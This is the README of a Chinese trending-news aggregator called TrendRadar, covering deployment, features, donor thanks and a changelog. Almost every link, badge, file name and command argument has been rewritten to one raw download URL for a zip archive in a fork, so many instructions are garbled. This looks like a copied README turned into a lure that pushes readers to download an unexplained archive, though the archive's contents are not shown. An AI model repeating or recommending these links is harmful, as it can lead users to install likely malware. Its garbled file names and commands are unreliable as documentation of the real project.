<div align="center" id="trendradar">

> **📢 公告：** **v4.0.0** 版本已发布！包含存储架构重构、数据库优化、模块化改进等重大更新

<a href="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" title="TrendRadar">
  
</a>

🚀 最快<strong>30秒</strong>部署的热点助手 —— 告别无效刷屏，只看真正关心的新闻资讯

<a href="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" target="_blank"></a>

<a href="https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip" target="_blank" title="AI 语音输入，比打字快 4 倍 ⚡"></a>

[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](LICENSE)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](#)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](#)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)


[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)
[](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

</div>

<div align="center">

**中文** | **[English](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)**

</div>

> 本项目以轻量，易部署为目标

<br>

<details>
<summary>🚨 <strong>【必读】重要公告：v4.0.0 部署方式与存储架构变更</strong></summary>

<br>

### 🛠️ 请选择适合你的部署方式

#### 🅰️ 方案一：Docker 部署（推荐 🔥）

* **特点**：最稳定、最简单，数据存储在 **本地 SQLite**，完全自主可控。

* **适用**：有自己的服务器、NAS 或长期运行的电脑。

* 👉 [跳转到 Docker 部署教程](#6-docker-部署)

---

#### 🅱️ 方案二：GitHub Actions 部署（已恢复 ✅）

* **特点**：数据不再直接写入仓库（Git Commit），而是存储在 **远程云存储**（支持 S3 兼容协议：Cloudflare R2、阿里云 OSS、腾讯云 COS 等）。

* **门槛**：**必须**配置一个 S3 兼容的对象存储服务（推荐免费的 Cloudflare R2）。

> **⚠️ 注意**：选择此方案，请务必执行以下两步配置：

#### 1. 🚀 推荐的开始方式：Use this template

为了保持仓库整洁，避免继承冗余的历史记录，我**建议**你使用 Template 模式：

1.  **点击**原仓库页面右上角的绿色 **[Use this template]** 按钮。

2.  **选择** "Create a new repository"。

> **💡 为什么要这样做？**
> * **Use this template**：创建一个全新的、干净的仓库，没有历史包袱。
> * **Fork**：会保留完整的提交历史和关联关系，占用 GitHub 更多资源。

#### 2. ☁️ 关于 GitHub Actions 必配的远程存储

如果你选择 **方案二 (GitHub Actions)**，则必须配置一个 S3 兼容的对象存储服务。

**支持的存储服务：**
- **Cloudflare R2**（推荐，免费额度充足）
- 其他 S3 兼容服务

**⚠️ 以 Cloudflare R2 为例的配置前置条件：**

根据 Cloudflare 平台规则，开通 R2 需绑定支付方式。

* **目的**：仅作身份验证（Verify Only），**不产生扣费**。

* **支付**：支持双币信用卡或国区 PayPal。

* **用量**：R2 的免费额度（10GB存储/月）足以覆盖本项目日常运行，无需担心付费。

👉 **[点击查看详细配置教程](#-快速开始)**

</details>

<br>

## 📑 快速导航

<div align="center">

| [🚀 快速开始](#-快速开始) | [🤖 AI 智能分析](#-ai-智能分析) | [⚙️ 配置详解](#配置详解) | [📝 更新日志](#-更新日志) | [❓ 答疑与交流](#问题答疑与交流) |
|:---:|:---:|:---:|:---:|:---:|
| [🐳 Docker部署](#6-docker-部署) | [🔌 MCP客户端](#-mcp-客户端) | [📚 项目相关](#-项目相关) | [🪄 赞助商](#-赞助商) | |

</div>

- 感谢**耐心反馈 bug** 的贡献者，你们的每一条反馈让项目更加完善😉;  
- 感谢**为项目点 star** 的观众们，**fork** 你所欲也，**star** 我所欲也，两者得兼😍是对开源精神最好的支持;  
- 感谢**关注[公众号](#问题答疑与交流)** 的读者们，你们的留言、点赞、分享和推荐等积极互动让内容更有温度😎。  

<details>
<summary>👉 点击展开：<strong>致谢名单</strong> (当前 <strong>🔥73🔥</strong> 位)</summary>

### 基础设施支持

感谢 **GitHub** 免费提供的基础设施，这是本项目得以**一键 fork**便捷运行的最大前提。

### 数据支持

本项目使用 [newsnow](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 项目的 API 获取多平台数据，特别感谢作者提供的服务。

经联系，作者表示无需担心服务器压力，但这是基于他的善意和信任。请大家：
- **前往 [newsnow 项目](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 点 star 支持**
- Docker 部署时，请合理控制推送频率，勿竭泽而渔

### 推广助力

> 感谢以下平台和个人的推荐(按时间排列)

- [小众软件](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) - 开源软件推荐平台
- [LinuxDo 社区](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) - 技术爱好者的聚集地
- [阮一峰周刊](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) - 技术圈有影响力的周刊

### 观众支持

> 感谢**给予资金支持**的朋友们，你们的慷慨已化身为键盘旁的零食饮料，陪伴着项目的每一次迭代。
>
> **"一元点赞"已暂停**，如仍想支持作者，可前往[公众号](#问题答疑与交流)文章底部点击"喜欢作者"。
>
> 一位可爱猫头像的朋友，不知你从哪个角落翻到了我的收款码，三连了 1.8，心意已收到，感谢厚爱

|           点赞人            |  金额  |  日期  |             备注             |
| :-------------------------: | :----: | :----: | :-----------------------: |
|           D*5          |  1.8 * 3 | 2025.11.24  |    | 
|           *鬼          |  1 | 2025.11.17  |    | 
|           *超          |  10 | 2025.11.17  |    | 
|           R*w          |  10 | 2025.11.17  | 这 agent 做的牛逼啊,兄弟    | 
|           J*o          |  1 | 2025.11.17  | 感谢开源,祝大佬事业有成    | 
|           *晨          |  8.88  | 2025.11.16  | 项目不错,研究学习中    | 
|           *海          |  1  | 2025.11.15  |    | 
|           *德          |  1.99  | 2025.11.15  |    | 
|           *疏          |  8.8  | 2025.11.14  |  感谢开源，项目很棒，支持一下   | 
|           M*e          |  10  | 2025.11.14  |  开源不易，大佬辛苦了   | 
|           **柯          |  1  | 2025.11.14  |     | 
|           *云          |  88  | 2025.11.13  |    好项目，感谢开源  | 
|           *W          |  6  | 2025.11.13  |      | 
|           *凯          |  1  | 2025.11.13  |      | 
|           对*.          |  1  | 2025.11.13  |    Thanks for your TrendRadar  | 
|           s*y          |  1  | 2025.11.13  |      | 
|           **翔          |  10  | 2025.11.13  |   好项目，相见恨晚，感谢开源！     | 
|           *韦          |  9.9  | 2025.11.13  |   TrendRadar超赞，请老师喝咖啡~     | 
|           h*p          |  5  | 2025.11.12  |   支持中国开源力量，加油！     | 
|           c*r          |  6  | 2025.11.12  |        | 
|           a*n          |  5  | 2025.11.12  |        | 
|           。*c          |  1  | 2025.11.12  |    感谢开源分享    | 
|           *记          |  1  | 2025.11.11  |        | 
|           *主          |  1  | 2025.11.10  |        | 
|           *了          |  10  | 2025.11.09  |        | 
|           *杰          |  5  | 2025.11.08  |        | 
|           *点          |  8.80  | 2025.11.07  |   开发不易，支持一下。     | 
|           Q*Q          |  6.66  | 2025.11.07  |   感谢开源！     | 
|           C*e          |  1  | 2025.11.05  |        | 
|           Peter Fan          |  20  | 2025.10.29  |        | 
|           M*n          |  1  | 2025.10.27  |      感谢开源  | 
|           *许          |  8.88  | 2025.10.23  |      老师 小白一枚，摸了几天了还没整起来，求教  | 
|           Eason           |  1  | 2025.10.22  |      还没整明白，但你在做好事  | 
|           P*n           |  1  | 2025.10.20  |          |
|           *杰           |  1  | 2025.10.19  |          |
|           *徐           |  1  | 2025.10.18  |          |
|           *志           |  1  | 2025.10.17  |          |
|           *😀           |  10  | 2025.10.16  |     点赞     |
|           **杰           |  10  | 2025.10.16  |          |
|           *啸           |  10  | 2025.10.16  |          |
|           *纪           |  5  | 2025.10.14  | TrendRadar         |
|           J*d           |  1  | 2025.10.14  | 谢谢你的工具，很好玩...          |
|           *H           |  1  | 2025.10.14  |           |
|           那*O           |  10  | 2025.10.13  |           |
|           *圆           |  1  | 2025.10.13  |           |
|           P*g           |  6  | 2025.10.13  |           |
|           Ocean           |  20  | 2025.10.12  |  ...真的太棒了！！！小白级别也能直接用...         |
|           **培           |  5.2  | 2025.10.2  |  github-yzyf1312:开源万岁         |
|           *椿           |  3  | 2025.9.23  |  加油，很不错         |
|           *🍍           |  10  | 2025.9.21  |           |
|           E*f           |  1  | 2025.9.20  |           |
|           *记            |  1  | 2025.9.20  |           |
|           z*u            |  2  | 2025.9.19  |           |
|           **昊            |  5  | 2025.9.17  |           |
|           *号            |  1  | 2025.9.15  |           |
|           T*T            |  2  | 2025.9.15  |  点赞         |
|           *家            |  10  | 2025.9.10  |           |
|           *X            |  1.11  | 2025.9.3  |           |
|           *飙            |  20  | 2025.8.31  |  来自老童谢谢         |
|           *下            |  1  | 2025.8.30  |           |
|           2*D            |  88  | 2025.8.13 下午 |           |
|           2*D            |  1  | 2025.8.13 上午 |           |
|           S*o            |  1  | 2025.8.05 |   支持一下        |
|           *侠            |  10  | 2025.8.04 |           |
|           x*x            |  2  | 2025.8.03 |  trendRadar 好项目 点赞          |
|           *远            |  1  | 2025.8.01 |            |
|           *邪            |  5  | 2025.8.01 |            |
|           *梦            |  0.1  | 2025.7.30 |            |
|           **龙            |  10  | 2025.7.29 |      支持一下      |


</details>

<br>

## ✨ 核心功能

### **全网热点聚合**

- 知乎
- 抖音
- bilibili 热搜
- 华尔街见闻
- 贴吧
- 百度热搜
- 财联社热门
- 澎湃新闻
- 凤凰网
- 今日头条
- 微博

默认监控 11 个主流平台，也可自行增加额外的平台

> 💡 详细配置教程见 [配置详解 - 平台配置](#1-平台配置)

### **智能推送策略**

**三种推送模式**：

| 模式 | 适用场景 | 推送特点 |
|------|---------|---------|
| **当日汇总** (daily) | 企业管理者/普通用户 | 按时推送当日所有匹配新闻（会包含之前推送过的） |
| **当前榜单** (current) | 自媒体人/内容创作者 | 按时推送当前榜单匹配新闻（持续在榜的每次都出现） |
| **增量监控** (incremental) | 投资者/交易员 | 仅推送新增内容，零重复 |

> 💡 **快速选择指南：**
> - 🔄 不想看到重复新闻 → 用 `incremental`（增量监控）
> - 📊 想看完整榜单趋势 → 用 `current`（当前榜单）
> - 📝 需要每日汇总报告 → 用 `daily`（当日汇总）
>
> 详细对比和配置教程见 [配置详解 - 推送模式详解](#3-推送模式详解)

**附加功能**（可选）：

| 功能 | 说明 | 默认 |
|------|------|------|
| **推送时间窗口控制** | 设定推送时间范围（如 09:00-18:00），避免非工作时间打扰 | 关闭 |
| **内容顺序配置** | 调整"热点词汇统计"和"新增热点新闻"的显示顺序（v3.5.0 新增） | 统计在前 |

> 💡 详细配置教程见 [配置详解 - 报告配置](#7-报告配置) 和 [配置详解 - 推送时间窗口](#8-推送时间窗口配置)

### **精准内容筛选**

设置个人关键词（如：AI、比亚迪、教育政策），只推送相关热点，过滤无关信息

**基础语法**（5种）：
- 普通词：基础匹配
- 必须词 `+`：限定范围
- 过滤词 `!`：排除干扰
- 数量限制 `@`：控制显示数量（v3.2.0 新增）
- 全局过滤 `[GLOBAL_FILTER]`：全局排除指定内容（v3.5.0 新增）

**高级功能**（v3.2.0 新增）：
- 🔢 **关键词排序控制**：按热度优先 or 配置顺序优先
- 📊 **显示数量精准限制**：全局配置 + 单独配置，灵活控制推送长度

**词组化管理**：
- 空行分隔，独立统计不同主题热点

> 💡 **基础配置教程**：[关键词配置 - 基础语法](#关键词基础语法)
>
> 💡 **高级配置教程**：[关键词配置 - 高级配置](#关键词高级配置)
>
> 💡 也可以不做筛选，完整推送所有热点（将 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 留空）

### **热点趋势分析**

实时追踪新闻热度变化，让你不仅知道"什么在热搜"，更了解"热点如何演变"

- **时间轴追踪**：记录每条新闻从首次出现到最后出现的完整时间跨度
- **热度变化**：统计新闻在不同时间段的排名变化和出现频次
- **新增检测**：实时识别新出现的热点话题，用🆕标记第一时间提醒
- **持续性分析**：区分一次性热点话题和持续发酵的深度新闻
- **跨平台对比**：同一新闻在不同平台的排名表现，看出媒体关注度差异

> 💡 推送格式说明见 [配置详解 - 推送格式参考](#5-推送格式参考)

### **个性化热点算法**

不再被各个平台的算法牵着走，TrendRadar 会重新整理全网热搜：

- **看重排名高的新闻**（占60%）：各平台前几名的新闻优先显示
- **关注持续出现的话题**（占30%）：反复出现的新闻更重要
- **考虑排名质量**（占10%）：不仅多次出现，还经常排在前列

> 💡 这三个比例可以调整，详见 [配置详解 - 热点权重调整](#4-热点权重调整)

### **多渠道实时推送**

支持**企业微信**(+ 微信推送方案)、**飞书**、**钉钉**、**Telegram**、**邮件**、**ntfy**、**Bark**、**Slack**，消息直达手机和邮箱

**📌 多账号推送说明（v3.5.0 新增）：**

- ✅ **支持多账号配置**：所有推送渠道（飞书、钉钉、企业微信、Telegram、ntfy、Bark、Slack）均支持配置多个账号
- ✅ **配置方式**：使用英文分号 `;` 分隔多个账号值
- ✅ **示例**：`FEISHU_WEBHOOK_URL` 的 Secret 值填写 `https://webhook1;https://webhook2`
- ⚠️ **配对配置**：Telegram 和 ntfy 需要保证配对参数数量一致（如 token 和 chat_id 都是 2 个）
- ⚠️ **数量限制**：默认每个渠道最多 3 个账号，超出会被截断

### **灵活存储架构**（v4.0.0 重大更新）

**多存储后端支持**：
- ☁️ **远程云存储**：GitHub Actions 环境默认，支持 S3 兼容协议（R2/OSS/COS 等），数据存储在云端，不污染仓库
- 💾 **本地 SQLite 数据库**：Docker/本地环境默认，数据完全可控
- 🔄 **自动后端选择**：根据运行环境智能切换存储方式

**数据格式**：
| 格式 | 用途 | 说明 |
|------|------|------|
| **SQLite** | 主存储 | 单文件数据库，查询快速，支持 MCP AI 分析 |
| **TXT** | 可选快照 | 可读文本格式，方便直接查看 |
| **HTML** | 报告展示 | 精美可视化页面，PC/移动端适配 |

**数据管理**：
- ✅ 自动清理过期数据（可配置保留天数）
- ✅ 时区配置支持（全球时区）

> 💡 详细说明见 [配置详解 - 存储配置](#9-存储配置)

### **多端部署**
- **GitHub Actions**：定时自动爬取 + 远程云存储（需签到续期）
- **Docker 部署**：支持多架构容器化运行，数据本地存储
- **本地运行**：Windows/Mac/Linux 直接运行


### **AI 智能分析（v3.0.0 新增）**

基于 MCP (Model Context Protocol) 协议的 AI 对话分析系统，让你用自然语言深度挖掘新闻数据

- **对话式查询**：用自然语言提问，如"查询昨天知乎的热点"、"分析比特币最近的热度趋势"
- **13 种分析工具**：涵盖基础查询、智能检索、趋势分析、数据洞察、情感分析等
- **多客户端支持**：Cherry Studio（GUI 配置）、Claude Desktop、Cursor、Cline 等
- **深度分析能力**：
  - 话题趋势追踪（热度变化、生命周期、爆火检测、趋势预测）
  - 跨平台数据对比（活跃度统计、关键词共现）
  - 智能摘要生成、相似新闻查找、历史关联检索

> **💡 使用提示**：AI 功能需要本地新闻数据支持
> - 项目自带 **11月1-15日** 测试数据，可立即体验
> - 建议自行部署运行项目，获取更实时的数据
>
> 详见 [AI 智能分析](#-ai-智能分析)

### **零技术门槛部署**

GitHub 一键 Fork 即可使用，无需编程基础。

> 30秒部署： GitHub Pages（网页浏览）支持一键保存成图片，随时分享给他人
>
> 1分钟部署： 企业微信（手机通知）

**💡 提示：** 想要**实时更新**的网页版？fork 后，进入你的仓库 Settings → Pages，启用 GitHub Pages。[效果预览](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)。

### **减少 APP 依赖**

从"被算法推荐绑架"变成"主动获取自己想要的信息"

**适合人群：** 投资者、自媒体人、企业公关、关心时事的普通用户

**典型场景：** 股市投资监控、品牌舆情追踪、行业动态关注、生活资讯获取


| Github Pages 效果(手机端适配、邮箱推送效果) | 飞书推送效果 |
|:---:|:---:|
|  |  |

<br>

## 📝 更新日志

>**升级说明**：
- **📌 查看最新更新**：**[原仓库更新日志](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip更新日志)**
- **提示**：不要通过 **Sync fork** 更新本项目，建议查看【历史更新】，明确具体的【升级方式】和【功能内容】
- **大版本升级**：从 v1.x 升级到 v2.y，建议删除现有 fork 后重新 fork，这样更省力且避免配置冲突


### 2025/12/17 - v4.0.1

- StorageManager 添加推送记录代理方法
- S3 客户端切换至 virtual-hosted style 以提升兼容性（支持腾讯云 COS 等更多服务）


### 2025/12/13 - mcp-v1.1.0

  **MCP 模块更新:**
  - 适配 v4.0.0，同时也兼容 v3.x 的数据
  - 新增存储同步工具：
    - `sync_from_remote`: 从远程存储拉取数据到本地
    - `get_storage_status`: 获取存储配置和状态
    - `list_available_dates`: 列出本地/远程可用日期范围


<details>
<summary>👉 点击展开：<strong>历史更新</strong></summary>


### 2025/12/13 - v4.0.0

**🎉 重大更新：全面重构存储和核心架构**

- **多存储后端支持**：引入全新的存储模块，支持本地 SQLite 和远程云存储（S3 兼容协议，推荐免费的 Cloudflare R2），适应 GitHub Actions、Docker 和本地环境。
- **数据库结构优化**：重构 SQLite 数据库表结构，提升数据效率和查询能力。
- **核心代码模块化**：将主程序逻辑拆分为 trendradar 包的多个模块，显著提升代码可维护性。
- **增强功能**：实现日期格式标准化、数据保留策略、时区配置支持、时间显示优化，并修复远程存储数据持久化问题，确保数据合并的准确性。
- **清理和兼容**：移除了大部分历史兼容代码，统一了数据存储和读取方式。


### 2025/12/03 - v3.5.0

**🎉 核心功能增强**

1. **多账号推送支持**
   - 所有推送渠道（飞书、钉钉、企业微信、Telegram、ntfy、Bark、Slack）支持多账号配置
   - 使用分号 `;` 分隔多个账号，例如：`FEISHU_WEBHOOK_URL=url1;url2`
   - 自动验证配对配置（如 Telegram 的 token 和 chat_id）数量一致性

2. **推送内容顺序可配置**
   - 新增 `reverse_content_order` 配置项
   - 支持自定义热点词汇统计与新增热点新闻的显示顺序

3. **全局过滤关键词**
   - 新增 `[GLOBAL_FILTER]` 区域标记，支持全局过滤不想看到的内容
   - 适用场景：过滤广告、营销、低质内容等

**🐳 Docker 双路径 HTML 生成优化**

- **问题修复**：解决 Docker 环境下 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 无法同步到宿主机的问题
- **双路径生成**：当日汇总 HTML 同时生成到两个位置
  - `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`（项目根目录）：供 GitHub Pages 访问
  - `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`：通过 Docker Volume 挂载，宿主机可直接访问
- **兼容性**：确保 Docker、GitHub Actions、本地运行环境均能正常访问网页版报告

**🐳 Docker MCP 镜像支持**

- 新增独立的 MCP 服务镜像 `wantcat/trendradar-mcp`
- 支持 Docker 部署 AI 分析功能，通过 HTTP 接口（端口 3333）提供服务
- 双容器架构：新闻推送服务与 MCP 服务独立运行，可分别扩展和重启
- 详见 [Docker 部署 - MCP 服务](#6-docker-部署)

**🌐 Web 服务器支持**

- 新增内置 Web 服务器，支持通过浏览器访问生成的报告
- 通过 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 命令控制启动/停止：`docker exec -it trend-radar python https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip start_webserver`
- 访问地址：`http://localhost:8080`（端口可配置）
- 安全特性：静态文件服务、目录限制、本地访问
- 支持自动启动和手动控制两种模式

**📖 文档优化**

- 新增 [报告配置](#7-报告配置) 章节：report 相关参数详解
- 新增 [推送时间窗口配置](#8-推送时间窗口配置) 章节：push_window 配置教程
- 新增 [执行频率配置](#9-执行频率配置) 章节：Cron 表达式说明和常用示例
- 新增 [多账号推送配置](#10-多账号推送配置) 章节：多账号推送配置详解
- 优化各配置章节：统一添加"配置位置"说明
- 简化快速开始配置说明：三个核心文件一目了然
- 优化 [Docker 部署](#6-docker-部署) 章节：新增镜像说明、推荐 git clone 部署、重组部署方式

**🔧 升级说明**：
- **GitHub Fork 用户**：更新 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`（新增多账号推送支持，无需修改现有配置）
- **多账号推送**：新功能，默认不启用，现有单账号配置不受影响


### 2025/11/26 - mcp-v1.0.3

  **MCP 模块更新:**
  - 新增日期解析工具 resolve_date_range,解决 AI 模型计算日期不一致的问题
  - 支持自然语言日期表达式解析(本周、最近7天、上月等)
  - 工具总数从 13 个增加到 14 个


### 2025/11/28 - v3.4.1

**🔧 格式优化**

1. **Bark 推送增强**
   - Bark 现支持 Markdown 渲染
   - 启用原生 Markdown 格式：粗体、链接、列表、代码块等
   - 移除纯文本转换，充分利用 Bark 原生渲染能力

2. **Slack 格式精准化**
   - 使用专用 mrkdwn 格式处理分批内容
   - 提升字节大小估算准确性（避免消息超限）
   - 优化链接格式：`<url|text>` 和加粗语法：`*text*`

3. **性能提升**
   - 格式转换在分批过程中完成，避免二次处理
   - 准确估算消息大小，减少发送失败率

**🔧 升级说明**：
- **GitHub Fork 用户**：更新 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`，`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`


### 2025/11/25 - v3.4.0

**🎉 新增 Slack 推送支持**

1. **团队协作推送渠道**
   - 支持 Slack Incoming Webhooks（全球流行的团队协作工具）
   - 消息集中管理，适合团队共享热点资讯
   - 支持 mrkdwn 格式（粗体、链接等）

2. **多种部署方式**
   - GitHub Actions：配置 `SLACK_WEBHOOK_URL` Secret
   - Docker：环境变量 `SLACK_WEBHOOK_URL`
   - 本地运行：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 配置文件


> 📖 **详细配置教程**：[快速开始 - Slack 推送](#-快速开始)

- 优化 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 和 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 一键安装 MCP 的体验

**🔧 升级说明**：
- **GitHub Fork 用户**：更新 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`


### 2025/11/24 - v3.3.0

**🎉 新增 Bark 推送支持**

1. **iOS 专属推送渠道**
   - 支持 Bark 推送（基于 APNs，iOS 平台）
   - 免费开源，简洁高效，无广告干扰
   - 支持官方服务器和自建服务器两种方式

2. **多种部署方式**
   - GitHub Actions：配置 `BARK_URL` Secret
   - Docker：环境变量 `BARK_URL`
   - 本地运行：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 配置文件

> 📖 **详细配置教程**：[快速开始 - Bark 推送](#-快速开始)

**🐛 Bug 修复**
- 修复 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 中 `ntfy_server_url` 配置不生效的问题 ([#345](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip))

**🔧 升级说明**：
- **GitHub Fork 用户**：更新 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`

### 2025/11/23 - v3.2.0

**🎯 新增高级定制功能**

1. **关键词排序优先级配置**
   - 支持两种排序策略：热度优先 vs 配置顺序优先
   - 满足不同使用场景：热点追踪 or 个性化关注

2. **显示数量精准控制**
   - 全局配置：统一限制所有关键词显示数量
   - 单独配置：使用 `@数字` 语法为特定关键词设置限制
   - 有效控制推送长度，突出重点内容

> 📖 **详细配置教程**：[关键词配置 - 高级配置](#关键词高级配置)

**🔧 升级说明**：
- **GitHub Fork 用户**：更新 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`


### 2025/11/18 - mcp-v1.0.2

  **MCP 模块更新:**
  - 优化查询今日新闻却可能错误返回过去日期的情况


### 2025/11/22 - v3.1.1

- **修复数据异常导致的崩溃问题**：解决部分用户在 GitHub Actions 环境中遇到的 `'float' object has no attribute 'lower'` 错误
- 新增双重防护机制：在数据获取阶段过滤无效标题（None、float、空字符串），同时在函数调用处添加类型检查
- 提升系统稳定性，确保在数据源返回异常格式时仍能正常运行

**升级说明**（GitHub Fork 用户）：
- 必须更新：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
- 建议使用小版本升级方式：复制替换上述文件


### 2025/11/20 - v3.1.0

- **新增个人微信推送支持**：企业微信应用可推送到个人微信，无需安装企业微信 APP
- 支持两种消息格式：`markdown`（企业微信群机器人）和 `text`（个人微信应用）
- 新增 `WEWORK_MSG_TYPE` 环境变量配置，支持 GitHub Actions、Docker、docker compose 等多种部署方式
- `text` 模式自动清除 Markdown 语法，提供纯文本推送效果
- 详见快速开始中的「个人微信推送」配置说明

**升级说明**（GitHub Fork 用户）：
- 必须更新：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`、`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`
- 可选更新：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`（如使用 GitHub Actions 部署）
- 建议使用小版本升级方式：复制替换上述文件

### 2025/11/12 - v3.0.5

- 修复邮件发送 SSL/TLS 端口配置逻辑错误
- 优化邮箱服务商（QQ/163/126）默认使用 465 端口（SSL）
- **新增 Docker 环境变量支持**：核心配置项（`enable_crawler`、`report_mode`、`push_window` 等）支持通过环境变量覆盖，解决 NAS 用户修改配置文件不生效的问题（详见 [🐳 Docker 部署](#-docker-部署) 章节）


### 2025/10/26 - mcp-v1.0.1

  **MCP 模块更新:**
  - 修复日期查询参数传递错误
  - 统一所有工具的时间参数格式


### 2025/10/31 - v3.0.4

- 解决飞书因推送内容过长而产生的错误，实现了分批推送


### 2025/10/23 - v3.0.3

- 扩大 ntfy 错误信息显示范围


### 2025/10/21 - v3.0.2

- 修复 ntfy 推送编码问题

### 2025/10/20 - v3.0.0

**重大更新 - AI 分析功能上线** 🤖

- **核心功能**：
  - 新增基于 MCP (Model Context Protocol) 的 AI 分析服务器
  - 支持13种智能分析工具：基础查询、智能检索、高级分析、系统管理
  - 自然语言交互：通过对话方式查询和分析新闻数据
  - 多客户端支持：Claude Desktop、Cherry Studio、Cursor、Cline 等

- **分析能力**：
  - 话题趋势分析（热度追踪、生命周期、爆火检测、趋势预测）
  - 数据洞察（平台对比、活跃度统计、关键词共现）
  - 情感分析、相似新闻查找、智能摘要生成
